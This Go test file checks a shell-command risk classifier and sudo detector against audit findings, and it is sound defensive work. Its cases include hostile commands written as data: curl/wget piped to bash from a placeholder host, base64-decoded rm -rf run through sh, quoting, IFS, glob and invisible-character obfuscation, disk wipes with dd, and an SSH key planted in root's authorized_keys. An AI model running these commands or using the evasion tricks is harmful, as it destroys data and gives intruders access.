package main

import "testing"

// TestClassifyRiskAllowList covers the audit findings (#5 #28 #48 #49, N15
// N16 N17 N29): anything the classifier cannot read is High, only
// allow-listed read-only commands are Low.
func TestClassifyRiskAllowList(t *testing.T) {
	cases := []struct {
		command string
		want    string
	}{
		// Allow-listed read-only commands stay Low.
		{"ls -la /var/log", "Low"},
		{"df -h", "Low"},
		{"uptime; df -h", "Low"},
		{"systemctl status nginx", "Low"},
		{"journalctl -u nginx -n 50 --no-pager", "Low"},
		{"git log --oneline -5 | head", "Low"},
		{"ps aux | grep nginx", "Low"},
		{"cat /etc/os-release && uname -a", "Low"},
		{"grep -r エラー /var/log/app", "Low"},
		{"ls /nonexistent 2>/dev/null", "Low"},
		{"docker ps -a", "Low"},
		{"ip addr show", "Low"},
		{"find /var/log -name app.log", "Low"},
		{"exit 3", "Low"},

		// Quoting, escapes and expansions are opaque (N15 N16 N29 #28).
		{"r''m -rf /srv/data", "High"},
		{`"r"m -rf /srv/data`, "High"},
		{`\rm -rf /srv/data`, "High"},
		{"{rm,-rf,/var/lib/app}", "High"},
		{"rm${IFS}-rf${IFS}/x", "High"},
		{"a=r;b=m;$a$b -rf /x", "High"},
		{"ls $(echo /)", "High"},
		{"ls `id`", "High"},
		{"ls ~root", "Low"},

		// Code handed to an interpreter or shell (N16).
		{"echo cm0gLXJmIC94 | base64 -d | sh", "High"},
		{"curl -s https://example.invalid/i | bash", "High"},
		{"wget -qO- https://example.invalid/i | sh", "High"},
		{"python3 -c print", "High"},
		{`python3 -c "import base64;exec(base64.b64decode('eA=='))"`, "High"},
		{"perl -e 1", "High"},
		{"awk -f prog.awk data", "High"},
		{"eval ls", "High"},
		{"bash script.sh", "High"},

		// Glob in command position lets the shell choose the program.
		{"/???/r? -rf /x", "High"},

		// Destructive commands regardless of option order (N17 #48).
		{"dd bs=1M if=/dev/zero of=/dev/sda", "High"},
		{"systemctl -q stop sshd", "High"},
		{"systemctl disable --now sshd", "High"},
		{"chmod 000 -R /etc", "High"},
		{"poweroff", "High"},
		{"crontab -r", "High"},
		{"find / -name x -delete", "High"},
		{"kill -9 1", "High"},

		// Redirections and writers (#49).
		{"echo ssh-ed25519 AAAA >> /root/.ssh/authorized_keys", "High"},
		{"echo x > /etc/motd", "High"},
		{"cp /tmp/x /etc/sudoers", "Medium"},
		{"tee /etc/motd", "Medium"},
		{"sed -i s/a/b/ /etc/hosts", "Medium"},
		{"sort -o /etc/passwd x", "Medium"},
		{"git -c core.pager=x log", "Medium"},
		{"date -s 2020-01-01", "Medium"},
		{"hostname evil", "Medium"},

		// Wrappers are judged by what they run, and are never Low.
		{"sudo ls", "Medium"},
		{"/usr/bin/sudo ls", "Medium"},
		{"sudo -u root /usr/bin/rm x", "High"},
		{"env FOO=1 rm x", "High"},
		{"timeout 5 reboot", "High"},
		{"ls | xargs rm", "High"},
		{"FOO=1 ls", "Medium"},

		// Separators the splitter does not treat as plain text.
		{"ls\nrm -rf /x", "High"},
		{"ls\rrm -rf /x", "High"},
		{"ls & rm -rf /x", "High"},
		{"ls # comment", "High"},

		// Invisible and bidi characters (N26).
		{"ls​", "High"},
		{"ls ‮rm", "High"},
		{"ls -la", "High"},

		{"", "High"},
	}
	for _, c := range cases {
		if got := classifyRisk(c.command); got != c.want {
			t.Errorf("classifyRisk(%q) = %s, want %s", c.command, got, c.want)
		}
	}
}

// TestCommandUsesSudo covers #6 and #29: the sudo rule must see sudo behind a
// full path, quoting or other wrappers.
func TestCommandUsesSudo(t *testing.T) {
	for _, command := range []string{
		"sudo id", "/usr/bin/sudo id", "'sudo' id", `s\udo id`, "env sudo id", "ls; sudo id", "doas id",
	} {
		if !commandUsesSudo(command) {
			t.Errorf("commandUsesSudo(%q) = false", command)
		}
	}
	for _, command := range []string{"ls -la", "echo sudo", "grep sudo /var/log/auth.log"} {
		if commandUsesSudo(command) {
			t.Errorf("commandUsesSudo(%q) = true", command)
		}
	}
}

// TestClassifyRiskWrappersAndOptions covers the third audit: options the
// classifier does not know fail closed instead of moving the command word.
func TestClassifyRiskWrappersAndOptions(t *testing.T) {
	cases := []struct {
		command string
		want    string
	}{
		// ip -batch runs every command in a file; verbs must be spelled out.
		{"ip -batch /tmp/x", "Medium"},
		{"ip -b /tmp/x", "Medium"},
		{"ip -force -batch /tmp/x", "Medium"},
		{"ip r f", "Medium"},
		{"ip route save", "Medium"},
		{"ip route restore", "Medium"},
		{"ip route flush", "Medium"},
		{"ip addr show", "Low"},
		{"ip -br -c link", "Low"},
		{"ip -4 route get 1.1.1.1", "Low"},
		{"ip a", "Low"},

		// file -C writes a compiled magic file.
		{"file -C -m /tmp/x", "Medium"},
		{"file -C", "Medium"},
		{"file --compile", "Medium"},
		{"file -b /etc/hosts", "Low"},

		// Long option abbreviations are matched like getopt_long does.
		{"sort --outp=/etc/passwd x", "Medium"},
		{"date --se=2020-01-01", "Medium"},
		{"date -us 2020-01-01", "Medium"},
		{"date -Iseconds", "Low"},
		{"journalctl --vac=1", "Medium"},

		// Final audit #1: allow-listed commands that write files or change
		// system state through options or operands are not Low.
		{"ss -D /home/u/.bashrc", "Medium"},
		{"ss -tanD/tmp/x", "Medium"},
		{"ss --diag=/home/u/.ssh/authorized_keys", "Medium"},
		{"ss --dia /tmp/x", "Medium"},
		{"ss -K dst 10.0.0.1", "Medium"},
		{"ss -tK", "Medium"},
		{"ss --kill", "Medium"},
		{"ss --ki", "Medium"},
		{"ss -tanp", "Low"},
		{"ss -lntu", "Low"},
		{"journalctl --cursor-file=/home/u/.ssh/authorized_keys -n 1", "Medium"},
		{"journalctl -n1 --cursor-file /etc/nologin", "Medium"},
		{"date 010100002030", "Medium"},
		{"date -u 0101000030", "Medium"},
		{"date -- 0101000030", "Medium"},
		{"date +%s", "Low"},
		{"date -u +%Y-%m-%d", "Low"},
		{"date -d yesterday +%F", "Low"},
		{"date --date yesterday", "Low"},
		{"date -r /etc/hosts", "Low"},
		{"date -ud @0", "Low"},
		{"date -d@0 0101000030", "Medium"},
		{"hostname --file=/tmp/h", "Medium"},
		{"hostname --file /tmp/h", "Medium"},
		{"hostname -F/tmp/h", "Medium"},
		{"hostname -F /tmp/h", "Medium"},
		{"hostname -b", "Medium"},
		{"hostname --boot", "Medium"},
		{"hostname", "Low"},
		{"hostname -f", "Low"},
		{"hostname -I", "Low"},

		// NAME+=value is an assignment prefix too.
		{"a+=1 rm -rf ~", "High"},
		{"A_+=x rm -rf ~", "High"},
		{"a+=1 ls", "Medium"},

		// Wrapper options outside the known table are High.
		{"env -S rm -rf ~", "High"},
		{"env --split-string=rm -rf ~", "High"},
		{"/usr/bin/time -o out rm -rf ~", "High"},
		{"time -o out ls", "High"},
		{"time -p ls", "Medium"},
		{"env --chdir /tmp rm -rf ~", "High"},
		{"env --chdir /tmp ls", "Medium"},
		{"env --unset X rm -rf ~", "High"},
		{"timeout --signal KILL 5 rm -rf ~", "High"},
		{"timeout --signal KILL 5 ls", "Medium"},
		{"timeout -s KILL 5 ls", "Medium"},
		{"xargs --max-args 1 rm -rf", "High"},
		{"xargs -n1 rm", "High"},
		{"ls | xargs -0 -n 1 ls", "Medium"},
		{"sudo --user root rm -rf ~", "High"},
		{"sudo --user=root ls", "Medium"},
		{"sudo -nu root ls", "Medium"},
		{"sudo --bogus ls", "High"},
		{"sudo -s", "High"},
		{"sudo -e /etc/sudoers", "High"},
		{"nice -n 5 ls", "Medium"},
		{"nice -5 ls", "Medium"},
		{"command -v rm", "Medium"},
		{"sudo -- rm x", "High"},

		// Printable but invisible characters are opaque.
		{"cat /etc/host\u034fname", "High"},
		{"ls x\ufe0f", "High"},
		{"ls x\U000e0100", "High"},
		{"ls \u3164", "High"},
		{"ls \u115f", "High"},
		{"ls \uffa0", "High"},
		{"ls \u2800", "High"},
		{"ls x\u17b4", "High"},
	}
	for _, c := range cases {
		if got := classifyRisk(c.command); got != c.want {
			t.Errorf("classifyRisk(%q) = %s, want %s", c.command, got, c.want)
		}
	}
	for _, command := range []string{"a+=1 sudo -n id", "A_+=x sudo id", "sudo --user root rm -rf ~"} {
		if !commandUsesSudo(command) {
			t.Errorf("commandUsesSudo(%q) = false", command)
		}
	}
}
